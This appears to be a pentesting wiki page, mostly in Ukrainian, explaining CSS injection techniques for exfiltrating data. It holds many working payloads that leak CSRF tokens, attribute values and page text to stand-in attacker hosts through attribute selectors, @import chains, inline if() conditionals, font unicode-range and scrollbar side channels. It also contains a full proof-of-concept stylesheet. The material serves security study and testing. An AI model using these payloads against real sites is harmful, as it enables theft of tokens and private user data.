# CSS Injection

{{#include ../../../banners/hacktricks-training.md}}

## CSS Injection

### Атрибутний селектор

CSS-селектори створюються так, щоб відповідати значенням атрибутів `name` та `value` елемента `input`. Якщо атрибут value елемента `input` починається з певного символу, завантажується попередньо визначений зовнішній ресурс:
```css
input[name="csrf"][value^="a"] {
background-image: url(https://attacker.com/exfil/a);
}
input[name="csrf"][value^="b"] {
background-image: url(https://attacker.com/exfil/b);
}
/* ... */
input[name="csrf"][value^="9"] {
background-image: url(https://attacker.com/exfil/9);
}
```
Однак цей підхід має обмеження при роботі з прихованими input-елементами (`type="hidden"`), оскільки приховані елементи не завантажують фонові зображення.

#### Обхід для прихованих елементів

Щоб обійти це обмеження, ви можете націлитися на наступний сусідній елемент за допомогою загального комбінатора сусідніх елементів `~`. Правило CSS тоді застосовується до всіх елементів, що йдуть після прихованого input-елемента, в результаті чого фонове зображення завантажується:
```css
input[name="csrf"][value^="csrF"] ~ * {
background-image: url(https://attacker.com/exfil/csrF);
}
```
Практичний приклад експлуатації цієї техніки детально описано в наведеному фрагменті коду. Ви можете переглянути його [here](https://gist.github.com/d0nutptr/928301bde1d2aa761d1632628ee8f24e).

#### Prerequisites for CSS Injection

Щоб техніка CSS Injection була ефективною, повинні бути виконані певні умови:

1. **Payload Length**: CSS injection vector має підтримувати достатньо довгі payloads, щоб вмістити сконструйовані селектори.
2. **CSS Re-evaluation**: Ви повинні мати можливість фреймити сторінку, що необхідно для ініціації повторної оцінки CSS з новими payloads.
3. **External Resources**: Техніка передбачає можливість використання зовнішньо розміщених зображень. Це може бути обмежено Content Security Policy (CSP) сайту.

### Blind Attribute Selector

As [**explained in this post**](https://portswigger.net/research/blind-css-exfiltration), it's possible to combine the selectors **`:has`** and **`:not`** to identify content even from blind elements. Це дуже корисно, коли ви не маєте уявлення про вміст веб-сторінки, яка завантажує CSS injection.\
Також можна використовувати ці селектори для витягнення інформації з кількох блоків одного типу, як у:
```html
<style>
html:has(input[name^="m"]):not(input[name="mytoken"]) {
background: url(/m);
}
</style>
<input name="mytoken" value="1337" />
<input name="myname" value="gareth" />
```
Combining this with the following **@import** technique, it's possible to exfiltrate a lot of **info using CSS injection from blind pages with** [**blind-css-exfiltration**](https://github.com/hackvertor/blind-css-exfiltration)**.**

### @import

Попередня техніка має деякі недоліки — перевірте передумови. Вам потрібно або мати можливість **відправити кілька посилань жертві**, або мати можливість **iframe the CSS injection vulnerable page**.

Однак існує інша хитра техніка, яка використовує **CSS `@import`** для покращення якості техніки.

Це вперше показав [**Pepe Vila**](https://vwzq.net/slides/2019-s3_css_injection_attacks.pdf) і працює вона так:

Замість того, щоб завантажувати ту саму сторінку знову і знову з десятками різних payload щоразу (як у попередньому випадку), ми збираємося **завантажити сторінку лише один раз і лише з @import на сервер атакуючого** (це payload, який потрібно відправити жертві):
```css
@import url("//attacker.com:5001/start?");
```
1. Імпорт отримає від зловмисників **CSS script** і **браузер його завантажить**.
2. Перша частина CSS script, яку надішле атакуючий, — це **ще один `@import` до сервера атакуючих знову.**
1. Сервер атакуючих поки не відповідатиме на цей запит, оскільки ми хочемо leak кілька символів, а потім відповісти на цей import з payload, щоб leak наступні.
3. Друга і більша частина payload буде **attribute selector leakage payload**
1. Це відправить на сервер атакуючих **перший символ секрету і останній**
4. Як тільки сервер атакуючих отримає **перший і останній символ секрету**, він **відповість на import, запитаний у кроці 2**.
1. Відповідь буде точно така ж, як у **кроках 2, 3 і 4**, але цього разу вона спробує **знайти другий символ секрету, а потім передостанній**.

Атакуючий буде f**ollow that loop until it manages to leak completely the secret**.

You can find the original [**Pepe Vila's code to exploit this here**](https://gist.github.com/cgvwzq/6260f0f0a47c009c87b4d46ce3808231) or you can find almost the [**same code but commented here**.](#css-injection)

> [!TIP]
> Скрипт буде намагатися відкривати по 2 символи щоразу (з початку і з кінця), тому що attribute selector дозволяє робити такі речі:
>
> ```css
> /* value^=  to match the beggining of the value*/
> input[value^="0"] {
>  --s0: url(http://localhost:5001/leak?pre=0);
> }
>
> /* value$=  to match the ending of the value*/
> input[value$="f"] {
>  --e0: url(http://localhost:5001/leak?post=f);
> }
> ```
>
> Це дозволяє скрипту faster витягувати секрет.

> [!WARNING]
> Іноді скрипт **неправильно визначає, що знайдені префікс + суфікс уже є повним flag**, і він продовжить вперед (в префіксі) і назад (в суфіксі) і в якийсь момент зависне.\
> Не хвилюйтеся, просто перевірте **output**, оскільки **ви можете побачити flag там**.

### Inline-Style CSS Exfiltration (attr() + if() + image-set())

This primitive enables exfiltration using only an element's inline style attribute, without selectors or external stylesheets. It relies on CSS custom properties, the attr() function to read same-element attributes, the new CSS if() conditionals for branching, and image-set() to trigger a network request that encodes the matched value.

> [!WARNING]
> Equality comparisons in if() require double quotes for string literals. Single quotes will not match.

- Sink: контролюйте style attribute елемента і переконайтеся, що цільовий атрибут знаходиться на тому ж елементі (attr() читає лише атрибути того самого елемента).
- Read: скопіюйте атрибут у CSS-перемінну: `--val: attr(title)`.
- Decide: оберіть URL за допомогою вкладених умовних виразів, порівнюючи перемінну зі строковими кандидатами: `--steal: if(style(--val:"1"): url(//attacker/1); else: url(//attacker/2))`.
- Exfiltrate: застосуйте `background: image-set(var(--steal))` (або будь-яку властивість, що викликає завантаження) щоб примусити запит до вибраної кінцевої точки.

Attempt (does not work; single quotes in comparison):
```html
<div style="--val:attr(title);--steal:if(style(--val:'1'): url(/1); else: url(/2));background:image-set(var(--steal))" title=1>test</div>
```
Робочий payload (для порівняння потрібні подвійні лапки):
```html
<div style='--val:attr(title);--steal:if(style(--val:"1"): url(/1); else: url(/2));background:image-set(var(--steal))' title=1>test</div>
```
Перерахування значень атрибутів із вкладеними умовами:
```html
<div style='--val: attr(data-uid); --steal: if(style(--val:"1"): url(/1); else: if(style(--val:"2"): url(/2); else: if(style(--val:"3"): url(/3); else: if(style(--val:"4"): url(/4); else: if(style(--val:"5"): url(/5); else: if(style(--val:"6"): url(/6); else: if(style(--val:"7"): url(/7); else: if(style(--val:"8"): url(/8); else: if(style(--val:"9"): url(/9); else: url(/10)))))))))); background: image-set(var(--steal));' data-uid='1'></div>
```
Реалістичне демо (перевірка імен користувачів):
```html
<div style='--val: attr(data-username); --steal: if(style(--val:"martin"): url(https://attacker.tld/martin); else: if(style(--val:"zak"): url(https://attacker.tld/zak); else: url(https://attacker.tld/james))); background: image-set(var(--steal));' data-username="james"></div>
```
Примітки та обмеження:

- Працює на браузерах на базі Chromium на момент дослідження; поведінка може відрізнятися на інших рушіях.
- Найкраще підходить для скінчених/перелічуваних просторів значень (IDs, flags, short usernames). Викрадення довільно довгих рядків без зовнішніх стилів залишається складним.
- Будь-яка CSS-властивість, яка отримує URL, може бути використана для тригеру запиту (e.g., background/image-set, border-image, list-style, cursor, content).

Автоматизація: Burp Custom Action може згенерувати nested inline-style payloads для brute-force значень атрибутів: https://github.com/PortSwigger/bambdas/blob/main/CustomAction/InlineStyleAttributeStealer.bambda

### Інші селектори

Інші способи доступу до частин DOM за допомогою **CSS selectors**:

- **`.class-to-search:nth-child(2)`**: Це знайде другий елемент з класом "class-to-search" у DOM.
- **`:empty`** селектор: Використовується, наприклад, в [**this writeup**](https://github.com/b14d35/CTF-Writeups/tree/master/bi0sCTF%202022/Emo-Locker)**:**

```css
[role^="img"][aria-label="1"]:empty {
background-image: url("YOUR_SERVER_URL?1");
}
```

### Error based XS-Search

**Reference:** [CSS based Attack: Abusing unicode-range of @font-face ](https://mksben.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html), [Error-Based XS-Search PoC by @terjanq](https://twitter.com/terjanq/status/1180477124861407234)

Загальна ідея полягає в тому, щоб **use a custom font from a controlled endpoint** та забезпечити, щоб **text (in this case, 'A') is displayed with this font only if the specified resource (`favicon.ico`) cannot be loaded**.
```html
<!DOCTYPE html>
<html>
<head>
<style>
@font-face {
font-family: poc;
src: url(http://attacker.com/?leak);
unicode-range: U+0041;
}

#poc0 {
font-family: "poc";
}
</style>
</head>
<body>
<object id="poc0" data="http://192.168.0.1/favicon.ico">A</object>
</body>
</html>
```
1. **Використання користувацького шрифту**:

- Користувацький шрифт визначено за допомогою правила `@font-face` всередині тега `<style>` в секції `<head>`.
- Шрифт названо `poc` і він завантажується з зовнішнього endpoint (`http://attacker.com/?leak`).
- Властивість `unicode-range` встановлено в `U+0041`, що націлено на конкретний Unicode-символ 'A'.

2. **Елемент `<object>` з запасним текстом**:
- В секції `<body>` створено елемент `<object>` з `id="poc0"`. Цей елемент намагається завантажити ресурс з `http://192.168.0.1/favicon.ico`.
- Для цього елементу `font-family` встановлено в `'poc'`, як визначено в секції `<style>`.
- Якщо ресурс (`favicon.ico`) не завантажиться, відобразиться запасний контент (буква 'A') всередині тега `<object>`.
- Запасний контент ('A') буде відрендерено з використанням користувацького шрифту `poc`, якщо зовнішній ресурс не може бути завантажений.

### Стилізація Scroll-to-Text Fragment

Псевдоклас **`:target`** використовується для вибору елемента, на який вказує **фрагмент URL**, як зазначено в [CSS Selectors Level 4 specification](https://drafts.csswg.org/selectors-4/#the-target-pseudo). Важливо розуміти, що `::target-text` не відповідає жодним елементам, якщо текст явно не націлений фрагментом.

Проблема безпеки виникає, коли зловмисники експлуатують функцію **Scroll-to-text** fragment, що дозволяє їм підтвердити наявність певного тексту на веб-сторінці, завантаживши ресурс з їхнього сервера через HTML injection. Метод включає ін'єкцію CSS-правила такого вигляду:
```css
:target::before {
content: url(target.png);
}
```
У таких сценаріях, якщо на сторінці присутній текст "Administrator", то з сервера запитується ресурс `target.png`, що вказує на наявність цього тексту. Екземпляр цієї атаки можна виконати через спеціально сформований URL, який вбудовує інжектований CSS разом із Scroll-to-text fragment:
```
http://127.0.0.1:8081/poc1.php?note=%3Cstyle%3E:target::before%20{%20content%20:%20url(http://attackers-domain/?confirmed_existence_of_Administrator_username)%20}%3C/style%3E#:~:text=Administrator
```
Тут атака маніпулює HTML injection, щоб передати CSS-код, орієнтований на конкретний текст "Administrator" через Scroll-to-text fragment (`#:~:text=Administrator`). Якщо текст знайдено, вказаний ресурс завантажується, ненавмисно сигналізуючи про його наявність нападнику.

Для пом'якшення ризику слід врахувати такі моменти:

1. **Constrained STTF Matching**: Scroll-to-text Fragment (STTF) призначений для співпадання лише зі словами або реченнями, таким чином обмежуючи його здатність leak arbitrary secrets or tokens.
2. **Restriction to Top-level Browsing Contexts**: STTF працює виключно в top-level browsing contexts і не функціонує в iframes, що робить будь-яку exploitation attempt більш помітною для користувача.
3. **Necessity of User Activation**: STTF потребує user-activation gesture для роботи, тобто exploitations можливі лише через user-initiated navigations. Ця вимога значно знижує ризик автоматизованих атак без взаємодії користувача. Тим не менш, автор статті в блозі вказує на специфічні умови та bypasses (наприклад, social engineering, взаємодія з поширеними browser extensions), які можуть спростити автоматизацію атаки.

Обізнаність про ці механізми та потенційні вразливості є ключовою для підтримки веб-безпеки та захисту від таких exploitative tactics.

For more information check the original report: [https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/](https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/)

Ви можете переглянути an [**exploit using this technique for a CTF here**](https://gist.github.com/haqpl/52455c8ddfec33aeefb468301d70b6eb).

### @font-face / unicode-range <a href="#text-node-exfiltration-i-ligatures" id="text-node-exfiltration-i-ligatures"></a>

Ви можете вказати **зовнішні шрифти для конкретних unicode-значень**, які будуть **завантажені лише якщо ці unicode-значення присутні** на сторінці. Наприклад:
```html
<style>
@font-face {
font-family: poc;
src: url(http://attacker.example.com/?A); /* fetched */
unicode-range: U+0041;
}
@font-face {
font-family: poc;
src: url(http://attacker.example.com/?B); /* fetched too */
unicode-range: U+0042;
}
@font-face {
font-family: poc;
src: url(http://attacker.example.com/?C); /* not fetched */
unicode-range: U+0043;
}
#sensitive-information {
font-family: poc;
}
</style>

<p id="sensitive-information">AB</p>
htm
```
When you access this page, Chrome and Firefox fetch "?A" and "?B" because text node of sensitive-information contains "A" and "B" characters. But Chrome and Firefox do not fetch "?C" because it does not contain "C". This means that we have been able to read "A" and "B".

### Text node exfiltration (I): ligatures <a href="#text-node-exfiltration-i-ligatures" id="text-node-exfiltration-i-ligatures"></a>

**Reference:** [Wykradanie danych w świetnym stylu – czyli jak wykorzystać CSS-y do ataków na webaplikację](https://sekurak.pl/wykradanie-danych-w-swietnym-stylu-czyli-jak-wykorzystac-css-y-do-atakow-na-webaplikacje/)

Описана техніка полягає у вилученні тексту з вузла шляхом використання лігатур шрифту та відстеження змін ширини. Процес складається з кількох кроків:

1. **Creation of Custom Fonts**:

- SVG fonts створюються з glyph'ами, що мають атрибут `horiz-adv-x`, який задає велику ширину для glyph, що представляє послідовність з двох символів.
- Example SVG glyph: `<glyph unicode="XY" horiz-adv-x="8000" d="M1 0z"/>`, where "XY" denotes a two-character sequence.
- Ці шрифти потім конвертуються у формат woff за допомогою fontforge.

2. **Detection of Width Changes**:

- У CSS забезпечують, щоб текст не переносився (`white-space: nowrap`) і налаштовують стиль смуги прокрутки.
- Поява горизонтальної смуги прокрутки, стилізованої особливим чином, виступає індикатором (oracle) того, що конкретна лігатура, а отже й конкретна послідовність символів, присутня в тексті.
- The CSS involved:
```css
body {
white-space: nowrap;
}
body::-webkit-scrollbar {
background: blue;
}
body::-webkit-scrollbar:horizontal {
background: url(http://attacker.com/?leak);
}
```

3. **Exploit Process**:

- **Step 1**: Fonts are created for pairs of characters with substantial width.
- **Step 2**: A scrollbar-based trick is employed to detect when the large width glyph (ligature for a character pair) is rendered, indicating the presence of the character sequence.
- **Step 3**: Upon detecting a ligature, new glyphs representing three-character sequences are generated, incorporating the detected pair and adding a preceding or succeeding character.
- **Step 4**: Detection of the three-character ligature is carried out.
- **Step 5**: The process repeats, progressively revealing the entire text.

4. **Optimization**:
- The current initialization method using `<meta refresh=...` is not optimal.
- A more efficient approach could involve the CSS `@import` trick, enhancing the exploit's performance.

### Text node exfiltration (II): leaking the charset with a default font (not requiring external assets) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Reference:** [PoC using Comic Sans by @Cgvwzq & @Terjanq](https://demo.vwzq.net/css2.html)

This trick was released in this [**Slackers thread**](https://www.reddit.com/r/Slackers/comments/dzrx2s/what_can_we_do_with_single_css_injection/). Набір символів (charset), який використовується в текстовому вузлі, може бути leaked **using the default fonts**, встановленими в браузері: зовнішні або кастомні шрифти не потрібні.

Концепція полягає в використанні анімації для поступового розширення ширини `div`, що дозволяє по одному символу переходити з 'suffix' частини тексту в 'prefix' частину. Цей процес фактично розбиває текст на дві секції:

1. **Prefix**: початковий рядок.
2. **Suffix**: наступний(і) рядки.

Стадії переходу символів виглядали б так:

**C**\
ADB

**CA**\
DB

**CAD**\
B

**CADB**

Під час цього переходу застосовується трюк `unicode-range` для ідентифікації кожного нового символу, коли він приєднується до prefix. Це досягається переключенням шрифту на Comic Sans, який помітно вищий за шрифт за замовчуванням, в результаті чого з'являється вертикальна смуга прокрутки. Поява цієї смуги побічно вказує на наявність нового символу в prefix.

Although this method allows the detection of unique characters as they appear, it does not specify which character is repeated, only that a repetition has occurred.

> [!TIP]
> Basically, the **unicode-range is used to detect a char**, but as we don't want to load an external font, we need to find another way.\
> When the **char** is **found**, it's **given** the pre-installed **Comic Sans font**, which **makes** the char **bigger** and **triggers a scroll bar** which will **leak the found char**.

Check the code extracted from the PoC:
```css
/* comic sans is high (lol) and causes a vertical overflow */
@font-face {
font-family: has_A;
src: local("Comic Sans MS");
unicode-range: U+41;
font-style: monospace;
}
@font-face {
font-family: has_B;
src: local("Comic Sans MS");
unicode-range: U+42;
font-style: monospace;
}
@font-face {
font-family: has_C;
src: local("Comic Sans MS");
unicode-range: U+43;
font-style: monospace;
}
@font-face {
font-family: has_D;
src: local("Comic Sans MS");
unicode-range: U+44;
font-style: monospace;
}
@font-face {
font-family: has_E;
src: local("Comic Sans MS");
unicode-range: U+45;
font-style: monospace;
}
@font-face {
font-family: has_F;
src: local("Comic Sans MS");
unicode-range: U+46;
font-style: monospace;
}
@font-face {
font-family: has_G;
src: local("Comic Sans MS");
unicode-range: U+47;
font-style: monospace;
}
@font-face {
font-family: has_H;
src: local("Comic Sans MS");
unicode-range: U+48;
font-style: monospace;
}
@font-face {
font-family: has_I;
src: local("Comic Sans MS");
unicode-range: U+49;
font-style: monospace;
}
@font-face {
font-family: has_J;
src: local("Comic Sans MS");
unicode-range: U+4a;
font-style: monospace;
}
@font-face {
font-family: has_K;
src: local("Comic Sans MS");
unicode-range: U+4b;
font-style: monospace;
}
@font-face {
font-family: has_L;
src: local("Comic Sans MS");
unicode-range: U+4c;
font-style: monospace;
}
@font-face {
font-family: has_M;
src: local("Comic Sans MS");
unicode-range: U+4d;
font-style: monospace;
}
@font-face {
font-family: has_N;
src: local("Comic Sans MS");
unicode-range: U+4e;
font-style: monospace;
}
@font-face {
font-family: has_O;
src: local("Comic Sans MS");
unicode-range: U+4f;
font-style: monospace;
}
@font-face {
font-family: has_P;
src: local("Comic Sans MS");
unicode-range: U+50;
font-style: monospace;
}
@font-face {
font-family: has_Q;
src: local("Comic Sans MS");
unicode-range: U+51;
font-style: monospace;
}
@font-face {
font-family: has_R;
src: local("Comic Sans MS");
unicode-range: U+52;
font-style: monospace;
}
@font-face {
font-family: has_S;
src: local("Comic Sans MS");
unicode-range: U+53;
font-style: monospace;
}
@font-face {
font-family: has_T;
src: local("Comic Sans MS");
unicode-range: U+54;
font-style: monospace;
}
@font-face {
font-family: has_U;
src: local("Comic Sans MS");
unicode-range: U+55;
font-style: monospace;
}
@font-face {
font-family: has_V;
src: local("Comic Sans MS");
unicode-range: U+56;
font-style: monospace;
}
@font-face {
font-family: has_W;
src: local("Comic Sans MS");
unicode-range: U+57;
font-style: monospace;
}
@font-face {
font-family: has_X;
src: local("Comic Sans MS");
unicode-range: U+58;
font-style: monospace;
}
@font-face {
font-family: has_Y;
src: local("Comic Sans MS");
unicode-range: U+59;
font-style: monospace;
}
@font-face {
font-family: has_Z;
src: local("Comic Sans MS");
unicode-range: U+5a;
font-style: monospace;
}
@font-face {
font-family: has_0;
src: local("Comic Sans MS");
unicode-range: U+30;
font-style: monospace;
}
@font-face {
font-family: has_1;
src: local("Comic Sans MS");
unicode-range: U+31;
font-style: monospace;
}
@font-face {
font-family: has_2;
src: local("Comic Sans MS");
unicode-range: U+32;
font-style: monospace;
}
@font-face {
font-family: has_3;
src: local("Comic Sans MS");
unicode-range: U+33;
font-style: monospace;
}
@font-face {
font-family: has_4;
src: local("Comic Sans MS");
unicode-range: U+34;
font-style: monospace;
}
@font-face {
font-family: has_5;
src: local("Comic Sans MS");
unicode-range: U+35;
font-style: monospace;
}
@font-face {
font-family: has_6;
src: local("Comic Sans MS");
unicode-range: U+36;
font-style: monospace;
}
@font-face {
font-family: has_7;
src: local("Comic Sans MS");
unicode-range: U+37;
font-style: monospace;
}
@font-face {
font-family: has_8;
src: local("Comic Sans MS");
unicode-range: U+38;
font-style: monospace;
}
@font-face {
font-family: has_9;
src: local("Comic Sans MS");
unicode-range: U+39;
font-style: monospace;
}
@font-face {
font-family: rest;
src: local("Courier New");
font-style: monospace;
unicode-range: U+0-10FFFF;
}

div.leak {
overflow-y: auto; /* leak channel */
overflow-x: hidden; /* remove false positives */
height: 40px; /* comic sans capitals exceed this height */
font-size: 0px; /* make suffix invisible */
letter-spacing: 0px; /* separation */
word-break: break-all; /* small width split words in lines */
font-family: rest; /* default */
background: grey; /* default */
width: 0px; /* initial value */
animation: loop step-end 200s 0s, trychar step-end 2s 0s; /* animations: trychar duration must be 1/100th of loop duration */
animation-iteration-count: 1, infinite; /* single width iteration, repeat trychar one per width increase (or infinite) */
}

div.leak::first-line {
font-size: 30px; /* prefix is visible in first line */
text-transform: uppercase; /* only capital letters leak */
}

/* iterate over all chars */
@keyframes trychar {
0% {
font-family: rest;
} /* delay for width change */
5% {
font-family: has_A, rest;
--leak: url(?a);
}
6% {
font-family: rest;
}
10% {
font-family: has_B, rest;
--leak: url(?b);
}
11% {
font-family: rest;
}
15% {
font-family: has_C, rest;
--leak: url(?c);
}
16% {
font-family: rest;
}
20% {
font-family: has_D, rest;
--leak: url(?d);
}
21% {
font-family: rest;
}
25% {
font-family: has_E, rest;
--leak: url(?e);
}
26% {
font-family: rest;
}
30% {
font-family: has_F, rest;
--leak: url(?f);
}
31% {
font-family: rest;
}
35% {
font-family: has_G, rest;
--leak: url(?g);
}
36% {
font-family: rest;
}
40% {
font-family: has_H, rest;
--leak: url(?h);
}
41% {
font-family: rest;
}
45% {
font-family: has_I, rest;
--leak: url(?i);
}
46% {
font-family: rest;
}
50% {
font-family: has_J, rest;
--leak: url(?j);
}
51% {
font-family: rest;
}
55% {
font-family: has_K, rest;
--leak: url(?k);
}
56% {
font-family: rest;
}
60% {
font-family: has_L, rest;
--leak: url(?l);
}
61% {
font-family: rest;
}
65% {
font-family: has_M, rest;
--leak: url(?m);
}
66% {
font-family: rest;
}
70% {
font-family: has_N, rest;
--leak: url(?n);
}
71% {
font-family: rest;
}
75% {
font-family: has_O, rest;
--leak: url(?o);
}
76% {
font-family: rest;
}
80% {
font-family: has_P, rest;
--leak: url(?p);
}
81% {
font-family: rest;
}
85% {
font-family: has_Q, rest;
--leak: url(?q);
}
86% {
font-family: rest;
}
90% {
font-family: has_R, rest;
--leak: url(?r);
}
91% {
font-family: rest;
}
95% {
font-family: has_S, rest;
--leak: url(?s);
}
96% {
font-family: rest;
}
}

/* increase width char by char, i.e. add new char to prefix */
@keyframes loop {
0% {
width: 0px;
}
1% {
width: 20px;
}
2% {
width: 40px;
}
3% {
width: 60px;
}
4% {
width: 80px;
}
4% {
width: 100px;
}
5% {
width: 120px;
}
6% {
width: 140px;
}
7% {
width: 0px;
}
}

div::-webkit-scrollbar {
background: blue;
}

/* side-channel */
div::-webkit-scrollbar:vertical {
background: blue var(--leak);
}
```
### Text node exfiltration (III): leaking the charset with a default font by hiding elements (not requiring external assets) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Reference:** This is mentioned as [an unsuccessful solution in this writeup](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

Цей випадок дуже схожий на попередній, проте тут мета зробити певні **chars** більшими за інші, щоб сховати щось — наприклад кнопку, яку бот не натисне, або зображення, яке не завантажиться. Таким чином ми можемо виміряти дію (або її відсутність) і дізнатися, чи присутній певний char у тексті.

### Text node exfiltration (III): leaking the charset by cache timing (not requiring external assets) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Reference:** This is mentioned as [an unsuccessful solution in this writeup](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

У цьому випадку ми можемо спробувати leak, щоб перевірити, чи є певний char у тексті, завантаживши фейковий шрифт з того самого origin:
```css
@font-face {
font-family: "A1";
src: url(/static/bootstrap.min.css?q=1);
unicode-range: U+0041;
}
```
Якщо відбудеться співпадіння, **шрифт буде завантажено з `/static/bootstrap.min.css?q=1`**. Хоча він не завантажиться успішно, **браузер має кешувати його**, і навіть якщо кешу немає, існує механізм **304 not modified**, тож **відповідь має бути швидшою**, ніж інші ресурси.

Однак, якщо різниця в часі між кешованою відповіддю та не кешованою недостатньо велика, це не буде корисно. Наприклад, автор згадував: «Однак після тестування я виявив, що першою проблемою є те, що швидкість практично не відрізняється, а другою — що bot використовує прапор `disk-cache-size=1`, що справді продумано.»

### Text node exfiltration (III): leaking the charset by timing loading hundreds of local "fonts" (not requiring external assets) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Посилання:** This is mentioned as [an unsuccessful solution in this writeup](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

У цьому випадку ви можете вказати **CSS to load hundreds of fake fonts** з того самого origin, коли відбувається співпадіння. Таким чином ви можете **виміряти час**, який це займає, і з’ясувати, чи з’являється char чи ні за допомогою чогось на кшталт:
```css
@font-face {
font-family: "A1";
src: url(/static/bootstrap.min.css?q=1), url(/static/bootstrap.min.css?q=2),
.... url(/static/bootstrap.min.css?q=500);
unicode-range: U+0041;
}
```
А код бота виглядає так:
```python
browser.get(url)
WebDriverWait(browser, 30).until(lambda r: r.execute_script('return document.readyState') == 'complete')
time.sleep(30)
```
Отже, якщо шрифт не співпадає, час відгуку при зверненні до бота очікується приблизно 30 секунд. Однак якщо є співпадіння шрифту, буде відправлено кілька запитів для отримання шрифту, що спричинить постійну мережеву активність. Внаслідок цього знадобиться більше часу, щоб виконати умову зупинки і отримати відповідь. Таким чином, час відгуку можна використовувати як індикатор для визначення співпадіння шрифту.

## Джерела

- [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)
- [https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b](https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b)
- [https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d](https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d)
- [https://x-c3ll.github.io/posts/CSS-Injection-Primitives/](https://x-c3ll.github.io/posts/CSS-Injection-Primitives/)
- [Inline Style Exfiltration: leaking data with chained CSS conditionals (PortSwigger)](https://portswigger.net/research/inline-style-exfiltration)
- [InlineStyleAttributeStealer.bambda (Burp Custom Action)](https://github.com/PortSwigger/bambdas/blob/main/CustomAction/InlineStyleAttributeStealer.bambda)
- [PoC page for inline-style exfiltration](https://portswigger-labs.net/inline-style-exfiltration-ff1072wu/test.php)
- [MDN: CSS if() conditional](https://developer.mozilla.org/en-US/docs/Web/CSS/if)
- [MDN: CSS attr() function](https://developer.mozilla.org/en-US/docs/Web/CSS/attr)
- [MDN: image-set()](https://developer.mozilla.org/en-US/docs/Web/CSS/image/image-set)

{{#include ../../../banners/hacktricks-training.md}}
